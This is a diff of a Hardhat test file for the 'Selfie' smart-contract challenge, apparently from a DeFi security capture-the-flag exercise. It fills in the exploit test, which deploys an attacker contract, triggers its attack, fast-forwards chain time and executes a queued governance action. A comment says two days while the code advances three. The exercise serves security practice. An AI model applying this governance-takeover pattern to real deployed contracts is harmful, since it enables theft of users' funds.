@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+// const { time } = require("@openzeppelin/test-helpers");
 
 describe('[Challenge] Selfie', function () {
     let deployer, attacker;
@@ -31,6 +32,16 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackerFactory = await ethers.getContractFactory("SelfieAttacker");
+        const attackerContract = await AttackerFactory.deploy(this.pool.address, this.governance.address, this.token.address, attacker.address);
+        await attackerContract.deployed();
+        await attackerContract.attack();
+
+        // Esperamos 2 días como lo solicita el contrato de gobernanza para ejecutar una acción.
+        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 2 días.
+
+        // Hora de la fatality: ejecutar la accion encolada.
+        await attackerContract.finishHim();
     });
 
     after(async function () {
